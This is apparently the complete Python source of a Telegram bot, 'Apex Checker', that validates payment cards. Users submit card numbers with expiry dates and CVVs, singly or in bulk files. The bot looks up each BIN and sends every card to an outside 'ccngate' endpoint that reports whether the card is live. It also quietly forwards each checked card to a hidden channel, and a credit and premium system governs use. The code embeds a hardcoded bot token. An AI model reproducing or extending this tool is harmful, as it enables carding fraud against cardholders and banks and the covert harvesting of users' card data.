import asyncio
import json
import logging
import os
import re
import time
from datetime import datetime
from typing import Dict, List, Optional

import aiofiles
import aiohttp
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# Configuration
BOT_TOKEN = "992401756:AAGouNmAdufry38HC0E6zz6Q7rWA0z642Nw"
ADMIN_ID = 7451622773
API_URL = "https://lamme2.onrender.com/ccngate/"
FORWARDER_PROFILE_CHANNEL = "@f2m3mm2euiaooplneh3eudj"
FORWARDER_CARDS_CHANNEL = "@aa22222222222222222dddd"
ADMIN_USERNAME = "@xxxxxxxx007xxxxxxxx"
CHANNEL_USERNAME = "@MOofatbot"

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User data storage
USERS_FILE = "users_data.json"
user_data = {}
user_sessions = {}  # Track user sessions and processing states

# Load user data
async def load_users():
    global user_data
    try:
        if os.path.exists(USERS_FILE):
            async with aiofiles.open(USERS_FILE, 'r') as f:
                content = await f.read()
                user_data = json.loads(content)
    except Exception as e:
        logger.error(f"Error loading users: {e}")
        user_data = {}

# Save user data
async def save_users():
    try:
        async with aiofiles.open(USERS_FILE, 'w') as f:
            await f.write(json.dumps(user_data, indent=2))
    except Exception as e:
        logger.error(f"Error saving users: {e}")

# Get BIN info
def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()
            
            if not data or 'brand' not in data:
                return {
                    'brand': 'UNKNOWN',
                    'type': 'UNKNOWN',
                    'level': 'UNKNOWN',
                    'bank': 'UNKNOWN',
                    'country': 'UNKNOWN',
                    'emoji': '🏳️'
                }
            
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('level', 'UNKNOWN'),
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN'),
                'emoji': data.get('country_flag', '🏳️')
            }
        
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    except Exception as e:
        logger.error(f"BIN lookup error: {str(e)}")
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }

# Check if user exists and create if not
async def ensure_user_exists(user_id: int, username: str = None):
    if str(user_id) not in user_data:
        user_data[str(user_id)] = {
            'user_id': user_id,
            'username': username,
            'credits': 15,
            'is_premium': False,
            'is_banned': False,
            'join_date': datetime.now().isoformat()
        }
        await save_users()
        
        # Forward user profile to channel
        try:
            profile_text = f"""🆕 NEW USER REGISTERED
━━━━━━━━━━━━━━━━━━━━━━
[✦] User ID: {user_id}
[✦] Username: @{username if username else 'None'}
[✦] Credits: 15
[✦] Rank: [Free]
[✦] Join Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━"""
            
            await context.bot.send_message(
                chat_id=FORWARDER_PROFILE_CHANNEL,
                text=profile_text
            )
        except Exception as e:
            logger.error(f"Error forwarding profile: {e}")

# Format CC for API
def format_cc(cc_input: str) -> Optional[str]:
    # Remove all spaces and special characters except |
    cc_clean = re.sub(r'[^0-9|]', '', cc_input.replace(' ', '|'))
    
    # Split by | and filter empty strings
    parts = [p for p in cc_clean.split('|') if p]
    
    if len(parts) < 4:
        return None
    
    cc_num = parts[0]
    month = parts[1].zfill(2)
    year = parts[2]
    cvv = parts[3]
    
    # Ensure year is 4 digits
    if len(year) == 2:
        year = '20' + year
    
    return f"{cc_num}|{month}|{year}|{cvv}"

# Check CC via API
async def check_cc_api(cc: str) -> Dict:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{API_URL}{cc}", timeout=30) as response:
                if response.status == 200:
                    result = await response.json()
                    if 'results' in result and result['results']:
                        return result['results'][0]
                return {'status': 'error', 'message': 'API Error'}
    except Exception as e:
        logger.error(f"API Error: {e}")
        return {'status': 'error', 'message': 'Under Maintenance'}

# Format response based on API result
def format_response(api_result: Dict, cc: str, bin_info: Dict, username: str, check_time: float) -> tuple:
    message = api_result.get('message', '')
    
    if 'CCN ADDED SUCCESSFULLY' in message and '3DS' not in message:
        emoji = '✅'
        response_text = 'CCN ADDED ✅'
    elif 'CCN ADDED SUCCESSFULLY' in message and '3DS' in message:
        emoji = '✅'
        response_text = 'CCN ADDED (3DS/OTP) ⚠️'
    elif 'INVALID CVV' in message:
        emoji = '✅'
        response_text = 'INVALID CVV --> CCN ✅'
    elif 'Card Declined' in message:
        emoji = '❌'
        response_text = 'Card Declined ❌'
    elif 'Does not support this type of purchase' in message:
        emoji = '⚠️'
        response_text = 'Does not support this type of purchase ⚠️'
    elif 'Card type not Supported' in message:
        emoji = '⚠️'
        response_text = 'Card type not Supported ⚠️'
    elif 'Invalid account' in message:
        emoji = '❌'
        response_text = 'Invalid account ❌'
    elif 'Under Maintenance' in message:
        return None, '[↯] Under Maintenance ⚠️'
    elif 'Proxy issue' in message:
        return None, '[↯] Proxy issue ❌'
    else:
        emoji = '⚠️'
        response_text = 'Card type not Supported ⚠️'
    
    formatted_message = f"""{emoji} CCN - AUTH
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗖 ⇾ {cc}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ CCN - AUTH
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → {response_text}

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}
[↯] Proxy ⇾ Live ✅

[↯] 𝗧𝗜𝗠𝗘 ⇾ {check_time:.2f}s

━━━━━━━━━━━━━━━━
Checked By: @{username} [Free]"""
    
    return True, formatted_message

# Main menu keyboard
def get_main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚪 Gates", callback_data="gates")],
        [InlineKeyboardButton("⚙️ Tools", callback_data="tools")],
        [InlineKeyboardButton("👤 Profile", callback_data="profile")],
        [InlineKeyboardButton("❌ Exit", callback_data="exit")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Gates menu keyboard
def get_gates_keyboard():
    keyboard = [
        [InlineKeyboardButton("💳 CCN - AUTH", callback_data="ccn_auth")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main"), InlineKeyboardButton("❌ Exit", callback_data="exit")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Tools menu keyboard
def get_tools_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_main"), InlineKeyboardButton("❌ Exit", callback_data="exit")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Profile menu keyboard
def get_profile_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_main"), InlineKeyboardButton("❌ Exit", callback_data="exit")]
    ]
    return InlineKeyboardMarkup(keyboard)

# CCN Auth keyboard
def get_ccn_auth_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_gates"), InlineKeyboardButton("❌ Exit", callback_data="exit")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Admin contact keyboard
def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("👨‍💻 Admin", url=f"https://t.me/{ADMIN_USERNAME.replace('@', '')}")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await ensure_user_exists(user.id, user.username)
    
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    welcome_text = f"""✨ Welcome to Apex Checker 
━━━━━━━━━━━━━━━━━━━━━━
🌐 Zone: America/New_York  
🕒 Current time: {current_time}

🔰 Use the buttons below or type a command to start.

📢 Channel: {CHANNEL_USERNAME}
👨‍💻 Owner: {ADMIN_USERNAME}"""
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=get_main_menu_keyboard()
    )

# Handle callback queries
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    username = query.from_user.username or "Unknown"
    
    if query.data == "exit":
        await query.delete_message()
        return
    
    elif query.data == "back_main":
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        welcome_text = f"""✨ Welcome to Apex Checker 
━━━━━━━━━━━━━━━━━━━━━━
🌐 Zone: America/New_York  
🕒 Current time: {current_time}

🔰 Use the buttons below or type a command to start.

📢 Channel: {CHANNEL_USERNAME}
👨‍💻 Owner: {ADMIN_USERNAME}"""
        
        await query.edit_message_text(
            welcome_text,
            reply_markup=get_main_menu_keyboard()
        )
    
    elif query.data == "gates":
        gates_text = """🚪 GATES MENU | 🧩
━━━━━━━━━━━━━━━━━━━━━━

💳 Select a gate to proceed:"""
        
        await query.edit_message_text(
            gates_text,
            reply_markup=get_gates_keyboard()
        )
    
    elif query.data == "back_gates":
        gates_text = """🚪 GATES MENU | 🧩
━━━━━━━━━━━━━━━━━━━━━━

💳 Select a gate to proceed:"""
        
        await query.edit_message_text(
            gates_text,
            reply_markup=get_gates_keyboard()
        )
    
    elif query.data == "ccn_auth":
        ccn_text = """[✦]✨ Apex Checker | 🧩
━━━━━━━━━━━━━━━━━━━━━━
[✦] CCN Auth - Free
[✦] Use .ccn
━━━━━━━━━━━━━━━━━━━━━━
[✦] CCN Mass - Premium
[✦] Use .ccnm
━━━━━━━━━━━━━━━━━━━━━━
[✦] Braintree Auth - Premium
[✦]  Coming Soon ℹ️
━━━━━━━━━━━━━━━━━━━━━━
[✦] Usage - Command .ccn
[✦] .ccn 4242424242424242|01|2030|200

[✦] Usage - Command .ccnm max-15
[✦] send .txt file of 15 cc and reply with .ccnm"""
        
        await query.edit_message_text(
            ccn_text,
            reply_markup=get_ccn_auth_keyboard()
        )
        
        # Set user session to ccn_auth mode
        user_sessions[user_id] = {'mode': 'ccn_auth', 'processing': False}
    
    elif query.data == "tools":
        tools_text = """⚙️ TOOLS MENU | 🪡
━━━━━━━━━━━━━━━━━━━━━━
ℹ️ INFO BIN
👉 .bin xxxxxxx"""
        
        await query.edit_message_text(
            tools_text,
            reply_markup=get_tools_keyboard()
        )
        
        # Set user session to tools mode
        user_sessions[user_id] = {'mode': 'tools', 'processing': False}
    
    elif query.data == "profile":
        user_info = user_data.get(str(user_id), {})
        
        if user_id == ADMIN_ID:
            rank = "[Owner]"
            credits = "∞"
        elif user_info.get('is_premium', False):
            rank = "[Premium]"
            credits = str(user_info.get('credits', 0))
        else:
            rank = "[Free]"
            credits = str(user_info.get('credits', 0))
        
        profile_text = f"""[✦]✨ PROFILE | 👤
━━━━━━━━━━━━━━━━━━━━━━ 
[✦] User ID: {user_id} 
[✦] Chat ID: {user_id} 
[✦] User: @{username}
[✦] Rank: {rank} 
[✦] Credits: {credits}
━━━━━━━━━━━━━━━━━━━━━━"""
        
        await query.edit_message_text(
            profile_text,
            reply_markup=get_profile_keyboard()
        )

# Handle text messages
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    message_text = update.message.text
    
    # Check if user is banned
    user_info = user_data.get(str(user_id), {})
    if user_info.get('is_banned', False):
        await update.message.reply_text(
            "[↯] Banned ⚠️",
            reply_markup=get_admin_keyboard()
        )
        return
    
    # Get user session
    session = user_sessions.get(user_id, {})
    
    # If user is processing, delete message
    if session.get('processing', False):
        await update.message.delete()
        return
    
    # Handle .ccn command
    if message_text.startswith('.ccn ') and session.get('mode') == 'ccn_auth':
        cc_input = message_text[5:].strip()
        formatted_cc = format_cc(cc_input)
        
        if not formatted_cc:
            await update.message.delete()
            return
        
        # Check BIN
        bin_number = formatted_cc[:6]
        bin_info = get_bin_info(bin_number)
        
        if bin_info['brand'] == 'UNKNOWN':
            await update.message.delete()
            return
        
        # Check credits
        if user_id != ADMIN_ID and user_info.get('credits', 0) <= 0:
            await update.message.reply_text(
                "[↯] Low Credits ⚠️",
                reply_markup=get_admin_keyboard()
            )
            return
        
        # Set processing state
        user_sessions[user_id]['processing'] = True
        
        # Send initial processing message
        processing_text = f"""🔄 CCN - AUTH
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗖 ⇾ {formatted_cc}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ CCN - AUTH
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → Processing wait

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ calculating...

━━━━━━━━━━━━━━━━
Checked By: @{username} [Free]"""
        
        processing_msg = await update.message.reply_text(processing_text)
        
        # Check CC via API
        start_time = time.time()
        api_result = await check_cc_api(formatted_cc)
        end_time = time.time()
        check_time = end_time - start_time
        
        # Format response
        is_valid, response_text = format_response(api_result, formatted_cc, bin_info, username, check_time)
        
        if is_valid is None:
            # API error
            await processing_msg.edit_text(response_text)
        else:
            # Deduct credit for valid check
            if user_id != ADMIN_ID and is_valid:
                user_data[str(user_id)]['credits'] -= 1
                await save_users()
            
            await processing_msg.edit_text(response_text)
            
            # Forward to cards channel
            try:
                await context.bot.send_message(
                    chat_id=FORWARDER_CARDS_CHANNEL,
                    text=f"""💳 CARD CHECKED
━━━━━━━━━━━━━━━━━━━━━━
{response_text}
━━━━━━━━━━━━━━━━━━━━━━"""
                )
            except Exception as e:
                logger.error(f"Error forwarding card: {e}")
        
        # Reset processing state and show main menu
        user_sessions[user_id]['processing'] = False
        
        # Send main menu after 2 seconds
        await asyncio.sleep(2)
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        welcome_text = f"""✨ Welcome to Apex Checker 
━━━━━━━━━━━━━━━━━━━━━━
🌐 Zone: America/New_York  
🕒 Current time: {current_time}

🔰 Use the buttons below or type a command to start.

📢 Channel: {CHANNEL_USERNAME}
👨‍💻 Owner: {ADMIN_USERNAME}"""
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=get_main_menu_keyboard()
        )
    
    # Handle .ccnm command
    elif message_text.strip() == '.ccnm' and session.get('mode') == 'ccn_auth':
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.delete()
            return
        
        # Check if user is premium or admin
        if user_id != ADMIN_ID and not user_info.get('is_premium', False):
            await update.message.reply_text(
                "[↯] Not authorized ⚠️",
                reply_markup=get_admin_keyboard()
            )
            return
        
        # Check credits
        if user_id != ADMIN_ID and user_info.get('credits', 0) <= 0:
            await update.message.reply_text(
                "[↯] Low Credits ⚠️",
                reply_markup=get_admin_keyboard()
            )
            return
        
        # Set processing state
        user_sessions[user_id]['processing'] = True
        
        # Download and process file
        try:
            file = await update.message.reply_to_message.document.get_file()
            file_content = await file.download_as_bytearray()
            content = file_content.decode('utf-8')
            
            # Extract CCs from file
            cc_lines = [line.strip() for line in content.split('\n') if line.strip()]
            
            # Limit cards based on user type
            if user_id == ADMIN_ID:
                max_cards = len(cc_lines)
            else:
                max_cards = min(15, user_info.get('credits', 0))
            
            cc_lines = cc_lines[:max_cards]
            
            # Process each CC
            for i, cc_line in enumerate(cc_lines):
                if user_id != ADMIN_ID and user_data[str(user_id)]['credits'] <= 0:
                    await update.message.reply_text(
                        "[↯] Low Credits ⚠️",
                        reply_markup=get_admin_keyboard()
                    )
                    break
                
                formatted_cc = format_cc(cc_line)
                if not formatted_cc:
                    continue
                
                # Check BIN
                bin_number = formatted_cc[:6]
                bin_info = get_bin_info(bin_number)
                
                if bin_info['brand'] == 'UNKNOWN':
                    continue
                
                # Send processing message
                processing_text = f"""🔄 CCN - AUTH [{i+1}/{len(cc_lines)}]
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗖 ⇾ {formatted_cc}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ CCN - AUTH
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → Processing wait

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ calculating...

━━━━━━━━━━━━━━━━
Checked By: @{username} [Premium]"""
                
                processing_msg = await update.message.reply_text(processing_text)
                
                # Check CC via API
                start_time = time.time()
                api_result = await check_cc_api(formatted_cc)
                end_time = time.time()
                check_time = end_time - start_time
                
                # Format response
                is_valid, response_text = format_response(api_result, formatted_cc, bin_info, username, check_time)
                
                if is_valid is None:
                    await processing_msg.edit_text(response_text)
                else:
                    # Deduct credit for valid check
                    if user_id != ADMIN_ID and is_valid:
                        user_data[str(user_id)]['credits'] -= 1
                        await save_users()
                    
                    await processing_msg.edit_text(response_text.replace('[Free]', '[Premium]'))
                    
                    # Forward to cards channel
                    try:
                        await context.bot.send_message(
                            chat_id=FORWARDER_CARDS_CHANNEL,
                            text=f"""💳 CARD CHECKED (MASS)
━━━━━━━━━━━━━━━━━━━━━━
{response_text.replace('[Free]', '[Premium]')}
━━━━━━━━━━━━━━━━━━━━━━"""
                        )
                    except Exception as e:
                        logger.error(f"Error forwarding card: {e}")
                
                # Small delay between checks
                await asyncio.sleep(1)
        
        except Exception as e:
            logger.error(f"Error processing file: {e}")
            await update.message.reply_text("Error processing file.")
        
        # Reset processing state
        user_sessions[user_id]['processing'] = False
        
        # Send main menu
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        welcome_text = f"""✨ Welcome to Apex Checker 
━━━━━━━━━━━━━━━━━━━━━━
🌐 Zone: America/New_York  
🕒 Current time: {current_time}

🔰 Use the buttons below or type a command to start.

📢 Channel: {CHANNEL_USERNAME}
👨‍💻 Owner: {ADMIN_USERNAME}"""
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=get_main_menu_keyboard()
        )
    
    # Handle .bin command
    elif message_text.startswith('.bin ') and session.get('mode') == 'tools':
        bin_input = message_text[5:].strip()
        
        # Extract first 6 digits
        bin_number = re.sub(r'[^0-9]', '', bin_input)[:6]
        
        if len(bin_number) < 6:
            await update.message.delete()
            return
        
        bin_info = get_bin_info(bin_number)
        
        bin_text = f"""[↯] Bin ⇾ {bin_number}
[↯] Type ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}"""
        
        await update.message.reply_text(bin_text)
        
        # Send main menu after 2 seconds
        await asyncio.sleep(2)
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        welcome_text = f"""✨ Welcome to Apex Checker 
━━━━━━━━━━━━━━━━━━━━━━
🌐 Zone: America/New_York  
🕒 Current time: {current_time}

🔰 Use the buttons below or type a command to start.

📢 Channel: {CHANNEL_USERNAME}
👨‍💻 Owner: {ADMIN_USERNAME}"""
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=get_main_menu_keyboard()
        )
    
    # Admin commands
    elif user_id == ADMIN_ID:
        if message_text == '/procheckusers':
            users_list = []
            for uid, udata in user_data.items():
                rank = "[Owner]" if int(uid) == ADMIN_ID else ("[Premium]" if udata.get('is_premium') else "[Free]")
                credits = "∞" if int(uid) == ADMIN_ID else str(udata.get('credits', 0))
                users_list.append(
                    f"ID: {uid} | @{udata.get('username', 'None')} | {rank} | Credits: {credits}"
                )
            
            users_text = "\n".join(users_list)
            
            # Save to file and send
            with open('users_list.txt', 'w') as f:
                f.write(users_text)
            
            await update.message.reply_document(
                document=open('users_list.txt', 'rb'),
                filename='users_list.txt'
            )
        
        elif message_text.startswith('/proaddcredit '):
            try:
                parts = message_text.split()
                target_id = parts[1]
                credits = int(parts[2])
                
                if target_id in user_data:
                    user_data[target_id]['credits'] += credits
                    await save_users()
                    await update.message.reply_text(f"Added {credits} credits to user {target_id}")
                else:
                    await update.message.reply_text("User not found")
            except:
                await update.message.reply_text("Invalid format. Use: /proaddcredit {userid} {amount}")
        
        elif message_text.startswith('/prodeductcredit '):
            try:
                parts = message_text.split()
                target_id = parts[1]
                credits = int(parts[2])
                
                if target_id in user_data:
                    user_data[target_id]['credits'] = max(0, user_data[target_id]['credits'] - credits)
                    await save_users()
                    await update.message.reply_text(f"Deducted {credits} credits from user {target_id}")
                else:
                    await update.message.reply_text("User not found")
            except:
                await update.message.reply_text("Invalid format. Use: /prodeductcredit {userid} {amount}")
        
        elif message_text.startswith('/promakepremium '):
            try:
                target_id = message_text.split()[1]
                if target_id in user_data:
                    user_data[target_id]['is_premium'] = True
                    await save_users()
                    await update.message.reply_text(f"User {target_id} is now premium")
                else:
                    await update.message.reply_text("User not found")
            except:
                await update.message.reply_text("Invalid format. Use: /promakepremium {userid}")
        
        elif message_text.startswith('/promakefree '):
            try:
                target_id = message_text.split()[1]
                if target_id in user_data:
                    user_data[target_id]['is_premium'] = False
                    await save_users()
                    await update.message.reply_text(f"User {target_id} is now free")
                else:
                    await update.message.reply_text("User not found")
            except:
                await update.message.reply_text("Invalid format. Use: /promakefree {userid}")
        
        elif message_text.startswith('/probanuser '):
            try:
                target_id = message_text.split()[1]
                if target_id in user_data:
                    user_data[target_id]['is_banned'] = True
                    await save_users()
                    await update.message.reply_text(f"User {target_id} is now banned")
                else:
                    await update.message.reply_text("User not found")
            except:
                await update.message.reply_text("Invalid format. Use: /probanuser {userid}")
        
        elif message_text.startswith('/prounbanuser '):
            try:
                target_id = message_text.split()[1]
                if target_id in user_data:
                    user_data[target_id]['is_banned'] = False
                    await save_users()
                    await update.message.reply_text(f"User {target_id} is now unbanned")
                else:
                    await update.message.reply_text("User not found")
            except:
                await update.message.reply_text("Invalid format. Use: /prounbanuser {userid}")
    
    # Delete other messages if user is in a specific mode and processing
    elif session.get('mode') in ['ccn_auth', 'tools']:
        await update.message.delete()

# Main function
async def main():
    # Load user data
    await load_users()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start the bot
    await application.run_polling()

if __name__ == '__main__':
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(main())
    except RuntimeError:
        asyncio.run(main())
